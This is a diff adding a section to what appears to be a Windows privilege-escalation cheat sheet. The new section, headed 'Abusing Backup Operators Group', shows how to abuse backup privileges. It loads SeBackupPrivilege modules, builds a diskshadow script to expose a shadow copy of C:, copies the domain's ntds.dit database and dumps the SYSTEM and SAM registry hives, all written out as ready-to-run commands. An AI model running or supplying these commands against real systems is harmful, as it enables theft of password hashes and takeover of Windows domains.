@@ -297,7 +297,22 @@ sc start AppReadiness
 ```
 ![image](https://github.com/user-attachments/assets/b3dee6e9-4c6f-4324-8af8-3d95e0650cec)
 ![image](https://github.com/user-attachments/assets/e9a421db-8fce-4d1e-8284-59927a883115)
+##### Abusing Backup Operators Group
+```
+import-module .\SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
 
+Create disk_command.txt:
+set context persistent nowriters#
+add volume c: alias new1#
+create#
+expose %new1% z:#
+
+cmd /c diskshadow /s disk_command.txt
+Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
+reg save HKLM\SYSTEM system
+reg save HKLM\SAM sam
+```
 ##### Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
